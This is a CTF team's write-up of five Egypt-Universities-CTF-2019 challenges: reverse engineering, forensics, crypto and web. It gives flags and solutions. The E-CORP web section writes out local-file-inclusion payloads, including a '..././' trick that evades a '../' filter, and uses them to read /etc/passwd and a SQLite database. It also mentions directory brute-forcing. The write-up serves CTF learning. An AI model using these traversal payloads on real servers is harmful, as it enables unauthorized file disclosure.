# Egypt-Universities-CTF-2019
Hey all this is 0xN1ghtRa1d team , this is our writeups for Egypt-Universities-CTF-2019 .
# Challenge name
Login
# Category
Malware Reverse Engineering
# Level
Easy
# Points
50
# Description
You are given an ELF file which require two paramters,first one is the username and second one is the password.
![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/first.png)
So it's time for IDA.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/idaview.png)

So it's clear now he is just checking if the  argv[1] = 'cybertalent' which is the username and do the same thing for argv[2]='P@ss' which is the pass.

# Flag
flag{cybertalent:P@ss}
# Challenge name
Pekz
# Category
Digital Forensics
# Level
Easy
# Points
50
# Description
You are given a pcap file which contain some HTTP requests and some TCP stream, you can find the flag easily just by viewing the file strings.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/pekz.png)

# Flag
FLAG{0h_dump_is_ez_recover_is_eazi3r!!}
# Challenge name
Keep Calm 
# Category
Digital Forensics
# Level
Meduim
# Points
100
# Description
In this challenge we are given gif which contain some random chars.
![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/scatter.gif)

So now the first thing we have to do here is extracting the gif frames.
I used this website https://picasion.com/get-frames/ to extract all the frames, after extraction we will find that each frame contain a 3 or 4 chars.
Now we have these chars ['zg5','MTI','U2N',,'MAo=','zND'] after looking to these chars it seems like it's a base64 string but the string
isn't in the right order after some trys i found that we have to generate all possible permutations of the strings and we know that the last part of the flag is 'MAo='.

So i wrote this simple script :D

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/script1.png)

After runing the script we found two valid strings.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/script_result.png)
# Flag
flag{1234567890}
# Challenge name
Irving Secret
# Category
Cryptography
# Level
Meduim
# Points
100
# Description
In this challenge we are given a pcap file which seems contain some random data.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/keep_clam1.png)

We were stuck here not knowing what to do,after some time we got a hint which say "The data in the pcap file is Rotated usinf ROT13".
Now we can start the work first we have to save the data then rotate it.
From wireshark show data as Raw then save it.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/keep_clam2.png)

Now we have a file contains the data we have to rotate all the data using ROT13 ,I used https://gchq.github.io/CyberChef/ to do this part.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/cyberchef2.png)
If we look carefully in the output window we will find EXIF which is the start of a jpeg file so let's save it and check the content of it.

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/flag.jpeg)

Now there was another hint which say "the image contain an MD5 hash which is the flag",we were runing out of time so we couldn't solve it but the solution was very simple the flag was the MD5sum of the image. 

![Image](https://github.com/0xN1ghtRa1d/Egypt-Universities-CTF-2019/blob/master/ir_flag.png)

# Flag
flag{0eed48c187f783159a6ab6dba559d458}
# Challenge Name
E-CORP
# Category

Web Security
# Level
Hard
# Points

200

# Description

LFI ( Local File Inclusion )
------------------------------

Page :  `http://3.121.98.79/E-CORP/?page=home.php`
trying to test simple payload `file:///etc/passwd`

Results : 
> Warning: include(./application/views/file:///etc/passwd): failed to open stream: No such file or directory in /var/www/html/E-CORP/index.php on line 84

>Warning: include(): Failed opening './application/views/file:///etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/E-CORP/index.php on line 84

you will get this error then we can use another method to get back into this dir /application/views/
`../../../../../../../../../../../etc/passwd` 

Results :
> Warning: include(./application/views/etc/passwd): failed to open stream: No such file or directory in /var/www/html/E-CORP/index.php on line 84

>Warning: include(): Failed opening './application/views/etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/E-CORP/index.php on line 84

It is clear that the application removes `../`  from the `page` value
So, we will circumvent the site by adding this value `..././` instead of `../` 
payload : `..././..././..././..././..././..././..././..././etc/passwd` the application will remove `../` from `..././..././..././..././..././..././..././..././etc/passwd` So the last result will be `../../../../../../../etc/passwd`


Results :

>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
 
 
Done !!
We will do Directory Bruteforce attack to search for the file that contains the flag

>[16:09:34] 200 -    4KB - /E-CORP/index.php
[16:09:55] 200 -   11B  - /E-CORP/LICENSE
[16:13:22] 200 -  939B  - /E-CORP/README.md
[16:13:27] 200 -   54B  - /E-CORP/robots.txt

`robots.txt`/`README.md`/ is public ! 

`/robots.txt` : 
>User-agent: *
>Disallow: /README.md
>Disallow: /LICENSE

`/README.md` :

>### E-CORP config ###
>Allsafe Cybersecurity Group 
>
>all data stored in SQLite database
><!-- Website default config -->
>Modify config values in `./application/config/config.php`.
>
>- error reporting level
>- database path
>- pages
>- default page
>- security
>
>### Current config recap ###
>
><!-- Development config -->
>
>$config = array();
>
>// Environment
>// $config['environment'] = 'production';
>$config['environment'] = 'development';
>
>// Security
>$config['secure'] = true;
>
>// Error reporting.
>if ($config['environment'] === 'production') {
>	ini_set('display_errors', 0);
>	error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
}
>
>
>// Database.
>$config['database-path'] = dirname(__FILE__) . `'/../database/E-Corp.db'`;
>$config['db'] = new SQLite3($config['database-path']);
>
>// Pages
>$config['pages'] = array('home.php', 'about.php', 'contact.php');
>$config['default-page'] = $config['pages'][0];


Certainly, `../database/E-Corp.db` contains the flag
`../database/E-Corp.db` >> `..././database/E-Corp.db`
we will include it  using  Payload `..././datbase/E-Corp.db` 

Results : 


>SQLite format 3@ .;� ����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�5�QtableempempCREATE TABLE emp ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL UNIQUE, description TEXT NOT NULL, image TEXT NOT NULL, secret TINYINT NOT NULL )%9indexsqlite_autoindex_emp_1emp ~0V _�~�4�5�1 SecretDatabase encrypted & secured by Allsafe Cybersecurity Group flag{LFI_l00k5_s0_c00l}.https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/c440cf7a-e325-4f07-9bf5-e253ea414d7b/d9gp63e-d5e5a516-9878-4acc-9934-2434945d0e15.jpg/v1/fill/w_622,h_350,q_70,strp/allsafe_by_threebik_d9gp63e-350t.jpg�''=�Scott KnowlesChief Technology Officerhttps://vignette.wikia.nocookie.net/mrrobot/images/d/d2/Scott.png/revision/latest/scale-to-width-down/310?cb=20150829181743�t)�=�Tyrell WellickSenior Vice President of Technology (former), Hacker, Chief Technology Officer (current)https://vignette.wikia.nocookie.net/mrrobot/images/1/1a/Mr.-Robot-1x04-3.jpg/revision/latest/scale-to-width-down/310?cb=20150725100044�W#��Terry Colbycareer executive, formerly Chief Technology Officer (CTO) of E Corphttps://vignette.wikia.nocookie.net/mrrobot/images/5/54/Terry_Colby.png/revision/latest/scale-to-width-down/310?cb=20150602173801�M')�cPhillip PriceCEO of E Corp.https://vignette.wikia.nocookie.net/mrrobot/images/d/dd/Tumblr_e4e0d09f125afbdd165cd11b97acba0c_3553aa05_1280.jpg/revision/latest/scale-to-width-down/310?cb=20190928214408 ������ Secret'Scott Knowles)Tyrell Wellick#Terry Colby' Phillip Price ��emp 



# Flag

flag{LFI_l00k5_s0_c00l}
